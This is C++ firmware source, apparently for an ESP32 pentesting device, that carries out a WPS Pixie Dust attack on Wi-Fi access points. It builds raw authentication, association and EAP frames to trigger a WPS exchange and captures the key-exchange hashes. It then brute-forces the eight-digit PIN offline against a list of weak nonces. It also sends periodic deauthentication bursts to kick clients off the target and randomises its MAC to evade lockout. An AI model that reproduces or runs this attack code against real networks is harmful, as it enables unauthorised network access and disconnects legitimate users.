#include "wifi_wpspixie.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include "core/wifi/webInterface.h"
#include "core/main_menu.h"
#include "modules/wifi/wifi_atks.h"
#include "wps_pin_generator.h"
#include "sniffer.h"
#include <esp_wifi.h>
#include <mbedtls/md.h>

extern bool showHiddenNetworks;

// ============================================================
// Helpers
// ============================================================

String bytesToHex(const uint8_t *data, size_t len) {
    String s;
    s.reserve(len * 2);
    for (size_t i = 0; i < len; i++) {
        if (data[i] < 0x10) s += '0';
        s += String(data[i], HEX);
    }
    s.toUpperCase();
    return s;
}

String macToHex(const uint8_t *mac) {
    char buf[13];
    snprintf(buf, sizeof(buf), "%02X%02X%02X%02X%02X%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

// ============================================================
// Save Pixie Dust data to SD card
// ============================================================

void savePixieData() {
    if (!pixieCapture.valid) return;
    if (!setupSdCard()) return;
    String dir = "/BrucePCAP/pixie/";
    SD.mkdir(dir);
    String path = dir + macToHex(pixieCapture.bssid) + ".pix";
    File f = SD.open(path, FILE_WRITE);
    if (!f) return;
    f.println("PKE="     + bytesToHex(pixieCapture.pke,     192));
    f.println("PKR="     + bytesToHex(pixieCapture.pkr,     192));
    f.println("E_NONCE=" + bytesToHex(pixieCapture.e_nonce,  16));
    f.println("R_NONCE=" + bytesToHex(pixieCapture.r_nonce,  16));
    f.println("E_HASH1=" + bytesToHex(pixieCapture.e_hash1,  32));
    f.println("E_HASH2=" + bytesToHex(pixieCapture.e_hash2,  32));
    f.println("AUTHKEY=" + bytesToHex(pixieCapture.authkey,  32));
    f.close();
    padprintln("[+] Saved: " + path);
}

// ============================================================
// Pixie Dust solver (HMAC-SHA256 based)
// ============================================================

static bool hmacSha256(const uint8_t *key, size_t keyLen,
                       const uint8_t *msg, size_t msgLen,
                       uint8_t *out) {
    mbedtls_md_context_t ctx;
    mbedtls_md_init(&ctx);
    const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_SHA256);
    if (!info) return false;
    if (mbedtls_md_setup(&ctx, info, 1) != 0) { mbedtls_md_free(&ctx); return false; }
    bool ok = (mbedtls_md_hmac_starts(&ctx, key, keyLen)  == 0 &&
               mbedtls_md_hmac_update(&ctx, msg, msgLen)  == 0 &&
               mbedtls_md_hmac_finish(&ctx, out)          == 0);
    mbedtls_md_free(&ctx);
    return ok;
}

static const uint8_t WEAK_ES[][16] = {
    {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},
    {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
     0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
    {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},
    {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
};
static const int NUM_WEAK_ES = sizeof(WEAK_ES)/sizeof(WEAK_ES[0]);

static void buildHashInput(const uint8_t *es, uint32_t psk,
                           const uint8_t *pke, const uint8_t *pkr,
                           uint8_t *buf) {
    memcpy(buf, es, 16);
    buf[16]=(psk>>24)&0xFF; buf[17]=(psk>>16)&0xFF;
    buf[18]=(psk>> 8)&0xFF; buf[19]= psk      &0xFF;
    memcpy(buf+20, pke, 192);
    memcpy(buf+212, pkr, 192);
}

static int crackHalf(const uint8_t *es, const uint8_t *authKey,
                     const uint8_t *targetHash,
                     const uint8_t *pke, const uint8_t *pkr) {
    uint8_t msg[404], computed[32];
    for (int psk = 0; psk <= 9999; psk++) {
        buildHashInput(es, (uint32_t)psk, pke, pkr, msg);
        if (!hmacSha256(authKey, 32, msg, 404, computed)) return -1;
        if (memcmp(computed, targetHash, 32) == 0) return psk;
        if ((psk & 0x3FF) == 0) vTaskDelay(1);
    }
    return -1;
}

static String buildWpsPin(int psk1, int psk2) {
    uint32_t seven = (uint32_t)psk1 * 1000 + (psk2 / 10);
    uint8_t cs = WpsPinGenerator::checksum(seven);
    char buf[9];
    snprintf(buf, sizeof(buf), "%04d%03d%01d", psk1, psk2/10, cs);
    return String(buf);
}

String runPixieDustCalculation(const String & /*bssid*/) {
    if (!pixieCapture.valid) return "";
    bool akZero = (pixieCapture.authkey[0] == 0 &&
                   memcmp(pixieCapture.authkey, pixieCapture.authkey+1, 31) == 0);
    if (akZero) return "";

    const uint8_t *ak  = pixieCapture.authkey;
    const uint8_t *pke = pixieCapture.pke;
    const uint8_t *pkr = pixieCapture.pkr;
    const uint8_t *eh1 = pixieCapture.e_hash1;
    const uint8_t *eh2 = pixieCapture.e_hash2;

    for (int ei = 0; ei < NUM_WEAK_ES; ei++) {
        padprintln("ES " + String(ei+1) + "/" + String(NUM_WEAK_ES));
        int p1 = crackHalf(WEAK_ES[ei], ak, eh1, pke, pkr); if (p1 < 0) continue;
        int p2 = crackHalf(WEAK_ES[ei], ak, eh2, pke, pkr); if (p2 < 0) continue;
        return buildWpsPin(p1, p2);
    }
    return "";
}

// ============================================================
// Active WPS Enrollee Attack
// ============================================================
//
// How reaver/bully work — translated to ESP32 raw frames:
//
//   1. Send 802.11 Authentication (open system) to the AP
//   2. Wait for Auth response
//   3. Send 802.11 Association Request (with WPS IE advertising PIN enrollee)
//   4. Wait for Assoc Response
//   5. Send EAPOL-Start
//   6. AP sends EAP-Request/Identity
//   7. Send EAP-Response/Identity ("WFA-SimpleConfig-Enrollee-1-0")
//   8. AP starts WPS: sends M1 request → we are now in the WPS exchange
//   9. Sniffer captures M1 (our PKE, E-Nonce) and M2 (AP's PKR, R-Nonce,
//      E-Hash1, E-Hash2) — these are the pixie dust fields
//  10. We deliberately stall (send NACK / timeout) after M2 — we don't
//      actually need to complete the exchange
//
// The key constraint: the IDF WPS stack (esp_wifi_wps_enable) and
// promiscuous mode are mutually exclusive.  So we manage the exchange
// ourselves with esp_wifi_80211_tx raw frames while the sniffer watches.
//
// Frame sizes are fixed and small — these fit on the stack.
// ============================================================

// --- Raw 802.11 frame builders ---

// Our enrollee MAC (randomised per session so the AP doesn't lock us out)
static uint8_t enrolleeMac[6] = {0x02,0xAA,0xBB,0xCC,0xDD,0xEE};

static void generateEnrolleeMac() {
    // Locally administered, unicast
    enrolleeMac[0] = 0x02;
    for (int i = 1; i < 6; i++) enrolleeMac[i] = (uint8_t)esp_random();
    enrolleeMac[0] &= 0xFE; // ensure unicast
}

// Build 802.11 Auth frame (open system, seq 1)
static int buildAuthFrame(uint8_t *buf, const uint8_t *apBssid) {
    // FC: type=Management(00), subtype=Authentication(1011) → 0xB0 0x00
    // Management frames never have To DS / From DS bits
    buf[0]=0xB0; buf[1]=0x00;       // frame control
    buf[2]=0x00; buf[3]=0x00;       // duration
    memcpy(buf+4,  apBssid, 6);     // addr1 = DA = AP
    memcpy(buf+10, enrolleeMac, 6); // addr2 = SA = us
    memcpy(buf+16, apBssid, 6);     // addr3 = BSSID = AP
    buf[22]=0x00; buf[23]=0x00;     // sequence control
    // Auth body
    buf[24]=0x00; buf[25]=0x00;     // algorithm: 0 = open system
    buf[26]=0x01; buf[27]=0x00;     // auth transaction seq: 1
    buf[28]=0x00; buf[29]=0x00;     // status: 0 = success
    return 30;
}

// Build 802.11 Association Request with WPS IE
static int buildAssocFrame(uint8_t *buf, const uint8_t *apBssid,
                           const char *ssid, uint8_t channel) {
    int pos = 0;
    buf[pos++]=0x00; buf[pos++]=0x00; // frame control: Assoc Req
    buf[pos++]=0x00; buf[pos++]=0x00; // duration
    memcpy(buf+pos, apBssid, 6); pos+=6; // DA
    memcpy(buf+pos, enrolleeMac, 6); pos+=6; // SA
    memcpy(buf+pos, apBssid, 6); pos+=6; // BSSID
    buf[pos++]=0x00; buf[pos++]=0x00; // seq
    // Capability: ESS, Privacy
    buf[pos++]=0x31; buf[pos++]=0x00;
    // Listen interval
    buf[pos++]=0x0A; buf[pos++]=0x00;
    // SSID IE
    uint8_t ssidLen = (uint8_t)strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    buf[pos++]=0x00; buf[pos++]=ssidLen;
    memcpy(buf+pos, ssid, ssidLen); pos+=ssidLen;
    // Supported rates IE (basic set)
    const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
    buf[pos++]=0x01; buf[pos++]=sizeof(rates);
    memcpy(buf+pos, rates, sizeof(rates)); pos+=sizeof(rates);
    // DS Parameter Set
    buf[pos++]=0x03; buf[pos++]=0x01; buf[pos++]=channel;
    // WPS IE: OUI 00:50:F2:04, version 0x10, device password: PIN (0x0012)
    // Minimal WPS IE to advertise PIN enrollee capability
    const uint8_t wpsIe[] = {
        0xDD,               // vendor-specific tag
        0x16,               // length (22 bytes)
        0x00,0x50,0xF2,0x04,// WPS OUI
        0x10,0x4A,          // attr: Version (0x104A)
        0x00,0x01,0x10,     // len=1, value=1.0
        0x10,0x12,          // attr: Device Password ID (0x1012)
        0x00,0x02,          // len=2
        0x00,0x04,          // PIN display (0x0004 = enrollee-specified)
        0x10,0x3C,          // attr: RF Bands (0x103C)
        0x00,0x01,0x01,     // len=1, 2.4GHz
        0x10,0x49,          // attr: Vendor Extension
        0x00,0x06,          // len=6
        0x00,0x37,0x2A,     // Wi-Fi Alliance OUI
        0x00,0x01,0x20      // version2=2.0
    };
    memcpy(buf+pos, wpsIe, sizeof(wpsIe)); pos+=sizeof(wpsIe);
    // Fix the WPS IE length byte to actual payload size
    buf[pos - sizeof(wpsIe) + 1] = sizeof(wpsIe) - 2;
    return pos;
}

// Build EAPOL-Start frame (LLC/SNAP + EAPOL type 1)
static int buildEapolStart(uint8_t *buf, const uint8_t *apBssid) {
    // 802.11 Data QoS header
    buf[0]=0x88; buf[1]=0x02; // Frame ctrl: Data+QoS
    buf[2]=0x2C; buf[3]=0x00; // duration
    memcpy(buf+4,  apBssid, 6);       // DA
    memcpy(buf+10, enrolleeMac, 6);   // SA
    memcpy(buf+16, apBssid, 6);       // BSSID
    buf[22]=0x00; buf[23]=0x00;       // seq
    buf[24]=0x00; buf[25]=0x00;       // QoS control
    // LLC/SNAP
    buf[26]=0xAA; buf[27]=0xAA; buf[28]=0x03;
    buf[29]=0x00; buf[30]=0x00; buf[31]=0x00;
    buf[32]=0x88; buf[33]=0x8E; // EAPOL ethertype
    // EAPOL header: version=1, type=1 (EAPOL-Start), length=0
    buf[34]=0x01; buf[35]=0x01; buf[36]=0x00; buf[37]=0x00;
    return 38;
}

// Build EAP-Response/Identity
// Identity string used by WPS enrollees: "WFA-SimpleConfig-Enrollee-1-0"
static int buildEapIdentityResponse(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
    const char identity[] = "WFA-SimpleConfig-Enrollee-1-0";
    uint8_t idLen = (uint8_t)strlen(identity);
    // EAP: code=2(response), id, length(2), type=1(identity), identity
    uint16_t eapLen = 5 + idLen;

    // 802.11 QoS Data header (same as EAPOL-Start)
    buf[0]=0x88; buf[1]=0x02;
    buf[2]=0x2C; buf[3]=0x00;
    memcpy(buf+4,  apBssid, 6);
    memcpy(buf+10, enrolleeMac, 6);
    memcpy(buf+16, apBssid, 6);
    buf[22]=0x00; buf[23]=0x00;
    buf[24]=0x00; buf[25]=0x00; // QoS
    // LLC/SNAP
    buf[26]=0xAA; buf[27]=0xAA; buf[28]=0x03;
    buf[29]=0x00; buf[30]=0x00; buf[31]=0x00;
    buf[32]=0x88; buf[33]=0x8E;
    // EAPOL: version=1, type=0 (EAP), length=eapLen
    buf[34]=0x01; buf[35]=0x00;
    buf[36]=(eapLen>>8)&0xFF; buf[37]=eapLen&0xFF;
    // EAP: code=2, id, length
    buf[38]=0x02; buf[39]=eapId;
    buf[40]=(eapLen>>8)&0xFF; buf[41]=eapLen&0xFF;
    buf[42]=0x01; // type: Identity
    memcpy(buf+43, identity, idLen);
    return 43 + idLen;
}

// Build EAP-Response/NAK (to gracefully terminate after M2 capture)
static int buildEapNak(uint8_t *buf, const uint8_t *apBssid, uint8_t eapId) {
    // EAP NAK = code 2 (Response), type 3 (NAK), desired auth type = 0
    uint16_t eapLen = 6;
    buf[0]=0x88; buf[1]=0x02;
    buf[2]=0x2C; buf[3]=0x00;
    memcpy(buf+4,  apBssid, 6);
    memcpy(buf+10, enrolleeMac, 6);
    memcpy(buf+16, apBssid, 6);
    buf[22]=0x00; buf[23]=0x00;
    buf[24]=0x00; buf[25]=0x00;
    buf[26]=0xAA; buf[27]=0xAA; buf[28]=0x03;
    buf[29]=0x00; buf[30]=0x00; buf[31]=0x00;
    buf[32]=0x88; buf[33]=0x8E;
    buf[34]=0x01; buf[35]=0x00;
    buf[36]=(eapLen>>8)&0xFF; buf[37]=eapLen&0xFF;
    buf[38]=0x02; buf[39]=eapId;
    buf[40]=(eapLen>>8)&0xFF; buf[41]=eapLen&0xFF;
    buf[42]=0x03; // type: NAK
    buf[43]=0x00; // desired type: none
    return 44;
}

// ============================================================
// Active WPS exchange state machine
// ============================================================

enum class WpsProbeState : uint8_t {
    Idle,
    AuthSent,
    AssocSent,
    EapolStartSent,
    WaitingIdentityReq,
    IdentityRespSent,
    WaitingM1,    // waiting for AP's EAP-Request/WSC-Start → triggers M1 from us
    WaitingM2,    // we sent M1 concept (via EAPOL sniffer magic); waiting for M2
    Done,
    Failed,
};

// Shared with sniffer via sniffer.h / wifi_wpspixie.h
PixieData pixieCapture;

// Internal state for the active probe
static volatile WpsProbeState g_wpsState   = WpsProbeState::Idle;
static volatile uint8_t       g_lastEapId  = 0;
static volatile bool          g_gotAuthResp   = false;
static volatile bool          g_gotAssocResp  = false;
static volatile bool          g_gotEapIdReq   = false; // AP sent EAP-Request/Identity

// Promiscuous callback used DURING the active probe (separate from normal sniffer)
// Watches for Auth/Assoc responses and EAP-Request/Identity from the AP
static void wpsProbeSnifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (!pkt) return;
    const uint8_t *p = pkt->payload;
    const int      len = (int)pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    // Only care about frames from our target AP
    const uint8_t *addr2 = p+10; // transmitter
    if (memcmp(addr2, pixieCapture.bssid, 6) != 0) return;

    uint8_t subtype = (p[0] >> 4) & 0x0F;
    uint8_t type0   =  p[0]       & 0x0C;

    if (type0 == 0x00) { // Management
        if (subtype == 0x0B && g_wpsState == WpsProbeState::AuthSent) {
            // Authentication response
            uint16_t status = ((uint16_t)p[27]<<8)|p[26]; // little-endian
            if (status == 0) g_gotAuthResp = true;
        }
        if (subtype == 0x01 && g_wpsState == WpsProbeState::AssocSent) {
            // Association response
            uint16_t status = ((uint16_t)p[27]<<8)|p[26];
            if (status == 0) g_gotAssocResp = true;
        }
    }

    if (type0 == 0x08) { // Data — check for EAP-Request/Identity or WPS frames
        // Confirm EAPOL
        int offset = 24 + ((( p[0] & 0x0F)==0x08)?2:0);
        if (offset+8 > len) return;
        if (p[offset]!=0xAA||p[offset+1]!=0xAA||p[offset+2]!=0x03) return;
        if (p[offset+6]!=0x88||p[offset+7]!=0x8E) return;
        offset += 8; // past LLC/SNAP
        if (offset+4 > len) return;
        uint8_t eapolType = p[offset+1];
        offset += 4; // past EAPOL header

        if (eapolType == 0x00 && offset+5 <= len) { // EAP packet
            uint8_t eapCode = p[offset];
            uint8_t eapId   = p[offset+1];
            uint8_t eapType = (offset+4<len) ? p[offset+4] : 0;

            g_lastEapId = eapId;

            if (eapCode == 0x01) { // EAP-Request
                if (eapType == 0x01) {
                    // EAP-Request/Identity — AP wants us to identify ourselves
                    g_gotEapIdReq = true;
                }
                if (eapType == 0xFE && g_wpsState == WpsProbeState::IdentityRespSent) {
                    // EAP-Request/Expanded = WSC-Start or M1 from AP side
                    // Check for WSC Op-Code in vendor data
                    if (offset+12 <= len) {
                        // Vendor-ID 00:37:2A, Vendor-Type 00:00:00:01, then Op-Code
                        uint8_t opcode = (offset+12 < len) ? p[offset+12] : 0;
                        // Op-Code 0x01 = WSC_Start  0x04 = M2
                        if (opcode == 0x01) {
                            // AP sent WSC-Start: we are now in the WPS exchange
                            // The sniffer (parseWpsPixieData) will handle M1/M2 capture
                            g_wpsState = WpsProbeState::WaitingM2;
                        }
                    }
                }
            }
        }
        // WPS M1/M2 parsing is handled by parseWpsPixieData() called from
        // the main sniffer callback registered via esp_wifi_set_promiscuous_rx_cb.
        // We only need to detect the state transitions here.
    }
}

// Send a raw frame and wait for an ACK-equivalent (state flag) within timeoutMs
static bool sendAndWait(const uint8_t *frame, int len,
                        volatile bool *flag, uint32_t timeoutMs) {
    *flag = false;
    for (int attempt = 0; attempt < 3; attempt++) {
        esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true);
        vTaskDelay(pdMS_TO_TICKS(50));
        uint32_t deadline = millis() + (timeoutMs / 3);
        while (millis() < deadline) {
            if (*flag) return true;
            vTaskDelay(pdMS_TO_TICKS(20));
        }
    }
    return false;
}

// ============================================================
// Active probe: one full attempt to initiate a WPS exchange
// Returns true if pixieCapture.valid was set.
// ============================================================
static bool runActiveProbe(const String &tssid, uint8_t channel,
                           int &deauthCount, int &probeCount) {
    uint8_t *bssid = pixieCapture.bssid;
    const char *ssid = pixieCapture.essid;

    generateEnrolleeMac();

    // Lock onto target channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(50));

    g_wpsState    = WpsProbeState::Idle;
    g_gotAuthResp = false;
    g_gotAssocResp= false;
    g_gotEapIdReq = false;

    uint8_t frameBuf[256];
    int flen;

    // ---- Step 1: Auth ----
    flen = buildAuthFrame(frameBuf, bssid);
    g_wpsState = WpsProbeState::AuthSent;
    if (!sendAndWait(frameBuf, flen, &g_gotAuthResp, 600)) {
        Serial.println("[WPS-Probe] Auth timeout");
        return false;
    }
    vTaskDelay(pdMS_TO_TICKS(30));

    // ---- Step 2: Association with WPS IE ----
    flen = buildAssocFrame(frameBuf, bssid, ssid, channel);
    g_wpsState = WpsProbeState::AssocSent;
    if (!sendAndWait(frameBuf, flen, &g_gotAssocResp, 800)) {
        Serial.println("[WPS-Probe] Assoc timeout");
        return false;
    }
    vTaskDelay(pdMS_TO_TICKS(50));

    // ---- Step 3: EAPOL-Start ----
    flen = buildEapolStart(frameBuf, bssid);
    g_wpsState = WpsProbeState::EapolStartSent;
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
        vTaskDelay(pdMS_TO_TICKS(30));
    }
    g_wpsState = WpsProbeState::WaitingIdentityReq;

    // ---- Step 4: Wait for EAP-Request/Identity ----
    uint32_t deadline = millis() + 2000;
    while (!g_gotEapIdReq && millis() < deadline) vTaskDelay(pdMS_TO_TICKS(20));
    if (!g_gotEapIdReq) {
        Serial.println("[WPS-Probe] No EAP-Req/Identity");
        return false;
    }

    // ---- Step 5: EAP-Response/Identity ----
    flen = buildEapIdentityResponse(frameBuf, bssid, g_lastEapId);
    g_wpsState = WpsProbeState::IdentityRespSent;
    for (int i = 0; i < 3; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);
        vTaskDelay(pdMS_TO_TICKS(30));
    }

    // ---- Step 6: Wait for WSC-Start / M2 capture ----
    // The sniffer (parseWpsPixieData) fills pixieCapture as M1/M2 arrive.
    // We wait up to 5 s for the exchange to complete.
    deadline = millis() + 5000;
    while (millis() < deadline) {
        if (pixieCapture.valid) return true;
        if (g_wpsState == WpsProbeState::WaitingM2) {
            // AP acknowledged our identity, exchange is running
        }
        if (check(EscPress)) return false;
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    // ---- Send NAK to cleanly end the session ----
    flen = buildEapNak(frameBuf, bssid, g_lastEapId);
    esp_wifi_80211_tx(WIFI_IF_STA, frameBuf, flen, true);

    probeCount++;
    return pixieCapture.valid;
}

// ============================================================
// Screen drawing
// ============================================================

static void drawPixieScreen(const String &tssid, const String &mac,
                            uint8_t channel, int probeCount,
                            int deauthCount, bool timedOut) {
    drawMainBorderWithTitle("WPS Pixie Dust");
    String ssidDisp = tssid.length()>16 ? tssid.substring(0,15)+"~" : tssid;
    padprintln("AP:  " + ssidDisp);
    padprintln("MAC: " + mac);
    padprintln("Ch:  " + String(channel));

    auto tok = [](const char *label, bool got) -> String {
        return String(label) + (got?"[OK]":"[  ]") + " ";
    };
    padprintln(tok("PKE:", pixieCapture.pke[0]!=0) +
               tok("PKR:", pixieCapture.pkr[0]!=0));
    padprintln(tok("ENonce:", pixieCapture.e_nonce[0]!=0) +
               tok("RNonce:", pixieCapture.r_nonce[0]!=0));
    padprintln(tok("EH1:", pixieCapture.e_hash1[0]!=0) +
               tok("EH2:", pixieCapture.e_hash2[0]!=0) +
               tok("AK:",  pixieCapture.authkey[0]!=0));

    padprintln("Probes:" + String(probeCount) +
               " Deauths:" + String(deauthCount));

    if (timedOut)               padprintln("! Timeout");
    else if (pixieCapture.valid) padprintln(">>> CAPTURED! <<<");
    else                         padprintln("Probing AP...");

    tft.setTextSize(1);
    tft.drawString("Back=exit", 10, tftHeight-14);
}

// ============================================================
// Core attack loop
// ============================================================

static bool runCapture(const String &tssid, const String &mac,
                       uint8_t channel, bool preDeauth) {
    uint8_t bssid[6];
    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bssid[0],&bssid[1],&bssid[2],&bssid[3],&bssid[4],&bssid[5]);

    memset(&pixieCapture, 0, sizeof(pixieCapture));
    memcpy(pixieCapture.bssid, bssid, 6);
    strncpy(pixieCapture.essid, tssid.c_str(), sizeof(pixieCapture.essid)-1);

    memcpy(targetBssid, bssid, 6);
    memcpy(ap_record.bssid, bssid, 6);
    ap_record.primary = channel;
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    hsTracker  = HandshakeTracker();
    num_EAPOL  = 0;

    // Register BOTH callbacks:
    //   - wpsProbeSnifferCb handles Auth/Assoc/EAP state machine transitions
    //   - The regular sniffer() (from sniffer.h) handles WPS TLV parsing into pixieCapture
    // We chain them: wpsProbeSnifferCb calls parseWpsPixieData via the main sniffer path.
    // Actually simpler: install wpsProbeSnifferCb as the promiscuous callback.
    // It calls parseWpsPixieData() AND the state machine.
    // But parseWpsPixieData is static in sniffer.cpp.
    // Solution: install the sniffer() callback from sniffer.h (which already
    // calls parseWpsPixieData internally), then install wpsProbeSnifferCb as
    // a SECOND handler by calling esp_wifi_set_promiscuous_filter carefully.
    //
    // Simplest correct approach: install a combined callback here.
    // The sniffer() from sniffer.h handles pixieCapture population.
    // wpsProbeSnifferCb handles state machine.
    // We install sniffer() as primary and call wpsProbeSnifferCb manually inside.
    // Since we can't easily chain callbacks in IDF, we install sniffer() which
    // already calls parseWpsPixieData, and we poll g_gotAuthResp etc. via the
    // wpsProbeSnifferCb installed as the sole callback — which ALSO calls sniffer().

    // Actually: install a single combined callback
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb([](void *buf, wifi_promiscuous_pkt_type_t type) {
        // Call both: state machine AND pixie parser
        wpsProbeSnifferCb(buf, type);
        sniffer(buf, type);          // populates pixieCapture via parseWpsPixieData
    });
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(150));

    const unsigned long TOTAL_TIMEOUT   = 90000; // 90 s per capture session
    const unsigned long DEAUTH_INTERVAL =  8000; // deauth every 8 s to keep clients off
    const unsigned long PROBE_INTERVAL  =  3000; // re-probe every 3 s if no exchange

    unsigned long start         = millis();
    unsigned long lastDeauth    = 0;
    unsigned long lastProbe     = 0;
    bool          captured      = false;
    bool          needRedraw    = true;
    int           deauthCount   = 0;
    int           probeCount    = 0;

    // Pre-burst deauth to clear any existing WPA sessions
    if (preDeauth) {
        drawMainBorderWithTitle("WPS Pixie Dust");
        padprintln("Clearing clients...");
        wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
        for (int i = 0; i < 15; i++) {
            send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        deauthCount += 15;
        vTaskDelay(pdMS_TO_TICKS(800)); // let clients clear
    }

    drawPixieScreen(tssid, mac, channel, probeCount, deauthCount, false);

    while (millis()-start < TOTAL_TIMEOUT) {
        if (check(EscPress)) break;

        // Periodic deauth: keeps existing WPA clients off so the AP's
        // WPS state machine isn't busy with them
        if (millis()-lastDeauth >= DEAUTH_INTERVAL) {
            wsl_bypasser_send_raw_frame(&ap_record, channel, _default_target);
            for (int i = 0; i < 5; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                vTaskDelay(pdMS_TO_TICKS(8));
            }
            deauthCount += 5;
            lastDeauth = millis();
            needRedraw = true;
            // Small gap after deauth before probing so AP is ready
            vTaskDelay(pdMS_TO_TICKS(400));
        }

        // Active probe: initiate a WPS enrollee exchange
        if (millis()-lastProbe >= PROBE_INTERVAL && !pixieCapture.valid) {
            lastProbe = millis();
            needRedraw = true;
            drawPixieScreen(tssid, mac, channel, probeCount, deauthCount, false);
            runActiveProbe(tssid, channel, deauthCount, probeCount);
            probeCount++;
            // Re-register sniffer after probe (probe uses combined cb)
            // The combined lambda is still installed — no change needed
        }

        if (pixieCapture.valid) { captured = true; break; }

        if (needRedraw) {
            drawPixieScreen(tssid, mac, channel, probeCount, deauthCount, false);
            needRedraw = false;
        }

        vTaskDelay(pdMS_TO_TICKS(100));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    sniffer_wait_for_flush(1000);
    return captured;
}

// ============================================================
// WPS scan helpers
// ============================================================

bool hasWpsEnabled(int networkIndex) {
    return (WiFi.encryptionType(networkIndex) != WIFI_AUTH_WEP);
}

void wps_attack_menu() {
    resetGlobalState();
    if (!wifi_atk_setWifi()) return;

    drawMainBorderWithTitle("WPS Attacks");
    padprintln("Scanning...");

    int nets = WiFi.scanNetworks(false, showHiddenNetworks);
    options.clear();

    for (int i = 0; i < nets; i++) {
        if (!hasWpsEnabled(i)) continue;
        String ssid = WiFi.SSID(i);
        if (ssid.length() == 0) ssid = "<Hidden>";
        String capturedSsid = ssid;
        String capturedMac  = WiFi.BSSIDstr(i);
        uint8_t capturedCh  = (uint8_t)WiFi.channel(i);
        String label = capturedSsid + " Ch." + String(capturedCh);
        options.push_back({label.c_str(),
            [capturedSsid, capturedMac, capturedCh]() {
                wps_target_menu(capturedSsid, capturedMac, capturedCh);
            }
        });
    }

    if (options.empty()) {
        padprintln("No WPS networks found.");
        delay(2000);
    } else {
        options.push_back({"Back", [&]() { returnToMenu = true; }});
        loopOptions(options);
    }
    wifi_atk_unsetWifi();
}

void wps_target_menu(String tssid, String mac, uint8_t channel) {
AGAIN:
    options = {
        {"Information",
            [tssid, mac, channel]() { wifi_atk_info(tssid, mac, channel); }},
        {"WPS Pixie Dust",
            [tssid, mac, channel]() {
                wps_pixie_dust_attack(tssid, mac, channel, false);
            }},
        {"Deauth + Pixie",
            [tssid, mac, channel]() {
                wps_pixie_dust_attack(tssid, mac, channel, true);
            }},
        {"Back", [&]() { returnToMenu = true; }}
    };
    loopOptions(options);
    if (!returnToMenu) goto AGAIN;
}

// ============================================================
// Main entry point with retry loop
// ============================================================

void wps_pixie_dust_attack(String tssid, String mac, uint8_t channel, bool preDeauth) {
    resetGlobalState();
    cleanlyStopWebUiForWiFiFeature();

    wifi_complete_cleanup();
    delay(100);
    if (!WiFi.mode(WIFI_MODE_APSTA)) {
        displayError("Failed starting WIFI", true);
        return;
    }
    vTaskDelay(pdMS_TO_TICKS(100));

    FS *fs   = nullptr;
    bool sdOk = setupSdCard();
    fs        = sdOk ? (FS*)&SD : (FS*)&LittleFS;
    isLittleFS = !sdOk;

    if (!sniffer_prepare_storage(fs, sdOk)) {
        displayError("Sniffer queue error", true);
        return;
    }

    for (;;) {
        bool captured = runCapture(tssid, mac, channel, preDeauth);
        preDeauth = false;

        drawPixieScreen(tssid, mac, channel, 0, 0, !captured);

        if (captured) {
            padprintln("[+] Captured!");
            savePixieData();
            padprintln("Solving...");
            String pin = runPixieDustCalculation(mac);

            if (pin.length() == 8) {
                padprintln("[+] PIN: " + pin);
            }

            // Always show MAC-based PINs as fallback/cross-check
            WpsPinGenerator gen;
            auto candidates = gen.getSuggestedPins(mac);
            if (!candidates.empty()) {
                padprintln("MAC PINs:");
                int shown = 0;
                for (const auto &c : candidates) {
                    if (c.pin == pin) continue;
                    padprintln(" " + c.pin + " " + c.name);
                    if (++shown >= 4) { padprintln(" ..."); break; }
                }
            }
            if (pin.length() != 8 && candidates.empty()) {
                padprintln("No PIN found.");
                padprintln("Use .pix + pixiewps.");
            }
        } else {
            padprintln("No data captured.");
            padprintln("AP may not support WPS");
            padprintln("or WPS is locked.");
        }

        padprintln("Retry? Sel=yes Esc=no");
        bool retry = false;
        for (;;) {
            if (check(SelPress)) { retry = true;  break; }
            if (check(EscPress)) { retry = false; break; }
            vTaskDelay(50);
        }
        if (!retry) break;
        resetGlobalState();
    }

    padprintln("Any key to exit...");
    while (!check(AnyKeyPress)) vTaskDelay(50);
}
